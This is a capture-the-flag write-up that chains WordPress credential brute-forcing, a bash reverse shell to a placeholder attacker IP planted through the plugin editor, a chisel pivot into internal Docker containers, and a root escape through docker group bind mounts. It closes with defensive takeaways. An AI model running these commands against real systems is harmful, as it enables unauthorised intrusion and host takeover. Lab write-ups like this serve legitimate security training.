For Business Reasons: WordPress to Docker escape via lxd

A default-credential WordPress login, a plugin editor turned reverse shell, a network full of nested Docker containers reached only through a manually built tunnel, and a root escape through a single group membership nobody thought to audit.

Room: For Business Reasons Category: Web / Pivoting / Linux Privesc Tools: WPScan, LinPEAS, Chisel

The setup: a WordPress site, a weak admin password, and a network of Docker containers layered behind it. The job: get a shell, discover the internal network, tunnel into it, and escalate to root.

The Investigation

1
Find a username, then brute-force the password

A default WordPress post, still attributed to its original author, gives away a likely username. wpscan confirms it's valid (the login form specifically says "unknown username" for invalid ones, a useful oracle), then brute-forces the password against it:

wpscan --url http://<target>/ -U sysadmin -P /usr/share/wordlists/rockyou.txt

A match comes back in under three minutes.

Why this works

A login form that distinguishes "wrong username" from "wrong password" is a username-enumeration oracle, whether or not that was the intent. Once a username is confirmed valid, brute-forcing the password alone is a much smaller search space.

2
Get a shell through the plugin editor

Logged in as admin, the built-in plugin editor accepts arbitrary PHP. A single line appended to an inactive plugin, then activated with a listener running:

exec('/bin/bash -c "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1"');

lands a shell as the low-privilege web user the instant the plugin activates.

Why this works

WordPress admin access is, by design, a way to execute arbitrary PHP through the theme/plugin editors. There's no separate vulnerability needed, the credentials alone are the exploit.

3
Discover a hidden Docker network

Curling a static LinPEAS binary onto the box and running it surfaces multiple network interfaces with Docker-style private ranges, evidence the current container has visibility into other containers it wasn't obviously connected to. A quick static nmap binary and a netcat port probe confirm live hosts on those ranges.

Why this works

LinPEAS surfaces exactly this kind of fact, extra network interfaces, in its standard output. A compromised container is often one hop away from an entire internal network most external scans would never see.

4
Tunnel in with Chisel

With no direct route from the attack box to the internal Docker network, chisel builds a reverse tunnel: a server on the attack box, a client on the compromised container forwarding a chosen local port to an internal host's SSH port.

# attack box
sudo chisel server -p 8001 --reverse -v

# compromised container
./chisel64 client <attacker-ip>:8001 R:127.0.0.1:8005:<internal-ip>:22

The server and local forwarding port have to be different numbers, reusing the same port for both fails silently with a confusing error. Once that's sorted, SSH to 127.0.0.1:8005 on the attack box reaches the internal container directly.

Why this works

Chisel tunnels an arbitrary TCP connection over a single outbound HTTP-like connection the compromised host can already make, turning one foothold into a route to anything that host can otherwise reach. It's the standard way to pivot when there's no direct network path.

5
Escalate to root through an lxd group membership

Checking group membership on the internal host shows the current user belongs to lxd. That group alone, with Docker available, is enough:

docker run -v /:/mnt --rm -it mysql:5.7 sh

Mounting the host's root filesystem into a throwaway container and shelling into it gives root, on the host, immediately.

Why this works

Membership in the lxd (or docker) group is functionally equivalent to root: anyone who can launch a container with the host filesystem bind-mounted can read, write, and execute anything on the host as root from inside that container.

Full Attack Chain

WordPress post: author name leaks a username
  → wpscan brute force: weak admin password found
       → plugin editor: reverse shell planted and triggered
            → LinPEAS: hidden Docker network interfaces found
                 → chisel reverse tunnel: internal container reached over SSH
                      → lxd group membership + docker: host root via bind mount

Takeaways

Login error messages can leak more than intended

A form that distinguishes invalid username from invalid password is handing attackers a free username-enumeration oracle.

One compromised container can expose a whole internal network

Extra interfaces on unfamiliar private ranges are worth investigating immediately, they're the difference between "one box" and "the whole environment."

lxd/docker group membership is root, full stop

There's no meaningful difference between "can run containers with host mounts" and "has root on the host." Audit that group membership as carefully as the actual sudoers file.
